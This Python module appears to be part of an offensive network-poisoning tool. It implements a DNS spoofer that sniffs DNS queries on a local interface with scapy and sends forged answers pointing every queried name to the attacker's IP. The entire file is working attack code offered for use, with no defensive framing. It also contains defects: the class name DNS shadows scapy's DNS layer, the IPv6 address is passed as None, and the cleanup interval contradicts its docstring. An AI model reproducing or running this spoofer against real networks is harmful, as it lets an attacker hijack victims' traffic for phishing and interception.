#!/usr/bin/env python3
#
from typing import List, Tuple, Type
import binascii
from scapy.all import (
    DNSRR,
    DNS,
    Ether,
    IP,
    UDP,
    sendp,
    sniff,
    packet,
    IPv6,
    DNSQR,
)
from .poisonnetwork import PoisonNetwork
import time
from loguru import logger
from threading import Thread
from colorama import Fore, Style

class DNS(PoisonNetwork):
    """[ DNS poisoner ]
    Args:
        ip (str): [ if of the attacker ]
        ipv6 (str): [ ipv6 of the attacker ]
        mac_address (str): [ mac of the attacker ]
        iface (str): [ interface of the current subnet used ]
        info_logger (logger): [ Logger for the output ]
        level (logger): [ Logger level to display information ]
    """

    def __init__(
        self,
        ip: str,
        mac_address: str,
        iface: str,
        info_logger: logger,
        level: str = "INFO",
    ):
        super().__init__(ip, None, mac_address, iface)
        self.__targets_used = []
        self.__logger_level = level
        self.__info_logger = info_logger

    @property
    def logger_level(self) -> str:
        return self.__logger_level

    @logger_level.setter
    def logger_level(self, level: str) -> None:
        self.__logger_level = level

    def __data_link_layer(self, pkt: packet) -> packet:
        """[ Add link layer to response packet ]

        Args:
            pkt (packet): [ sniffed packet ]

        Returns:
            [ packet ]: [ Package with link layer added ]
        """
        return Ether(dst=pkt[Ether].src, src=self.mac_address)

    def __network_layer(self, pkt: packet, response: packet) -> Tuple[packet.Type, str]:
        """[ Add network layer to the response packet ]

        Args:
            pkt (packet): [ sniffed packet ]
            response (packet): [ Packet to be send to the victim  ]

        Returns:
            Tuple[packet.Type, str]: [ malicious package and ip of the target ]
        """
        ip_of_the_packet = None
        if IP in pkt:
            if pkt[IP].src == self.ip:
                return
            response /= IP(dst=pkt[IP].src)
            ip_of_the_packet = pkt[IP].src
        elif IPv6 in pkt:
            if pkt[IPv6].src == self.ipv6:
                return
            response /= IPv6(dst=pkt[IPv6].src)
            ip_of_the_packet = pkt[IPv6].src
        return response, ip_of_the_packet

    def __transport_layer(self, pkt: packet, response: packet) -> packet:
        """[ Add transport layer to the response packet ]

        Args:
            response (packet): [ Packet to be send to the victim ]

        Returns:
            packet: [ Malicious packet ]
        """
        response /= UDP(sport=53, dport=pkt[UDP].sport)
        return response

    def __dns_resource_record(self, pkt: packet) -> DNSRR:
        """[ Function to configure dns record for the response ]

        Args:
            pkt (packet): [ sniffed package ]

        Returns:
            DNSRR: [ DNS record ]
        """
        return DNSRR(rrname=pkt[DNSQR].qname, rdata=self.ip)

    def __application_layer(self, pkt: packet, response: packet) -> packet:
        """[ Add application layer to the response packet ]

        Args:
            pkt (packet): [ Sniffed packet ]
            response (packet): [ packet to be send to the victim ]

        Returns:
            packet: [ Malicious packet ]
        """

        response /= DNS(
            id=pkt[DNS].id,
            ancount=1,
            an=self.__dns_resource_record(pkt),
        )

        return response

    def __send_packet(self, response: packet, ip_of_the_packet: str) -> None:
        """[ Function to send the malicious packet to the victim ]

        Args:
            response (packet): [ Malicious packet ]
            ip_of_the_packet (str): [ ip of the victim ]
        """
        self.__info_logger.debug("Packet crafted: ")
        self.__info_logger.debug(response.summary())
        if ip_of_the_packet not in self.__targets_used:
            self.__info_logger.log(
                self.__logger_level,
                f"{Fore.CYAN}(DNS) Sending packet to {ip_of_the_packet}{Style.RESET_ALL}",
            )
            sendp(response, verbose=False)
            self.__targets_used.append(ip_of_the_packet)

    def __filter_for_dns(self, pkt: packet) -> bool:
        """[ Filter by sniffed packets of interest ]

        Args:
            pkt (packet): [ sniffed packet ]

        Returns:
            bool: [ If the packet is asking for a resource ]
        """
        return pkt.haslayer(DNS) and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0

    def __craft_malicious_packets(self, pkt: packet) -> None:
        """[ Function to craft a malicious packet ]

        Args:
            pkt (packet): [ Sniffed packet ]
        """
        if self.__filter_for_dns(pkt):
            response = self.__data_link_layer(pkt)
            response, ip_of_the_packet = self.__network_layer(pkt, response)
            response = self.__transport_layer(pkt, response)
            response = self.__application_layer(pkt, response)
            self.__send_packet(response, ip_of_the_packet)

    def start_dns_poisoning(self) -> None:
        """[ Function to start the poisoner ]"""
        self.__info_logger.log(self.__logger_level, "Starting dns poisoning...")
        cleaner_thread = Thread(target=self.__cleaner)
        cleaner_thread.daemon = True
        cleaner_thread.start()
        sniff(
            filter="udp and port 53",
            iface=self.iface,
            prn=self.__craft_malicious_packets,
            store=0,
        )

    def __cleaner(self) -> None:
        """[ Function to clean the list of objectives every 3 seconds ]"""
        while True:
            time.sleep(10)
            self.__targets_used.clear()
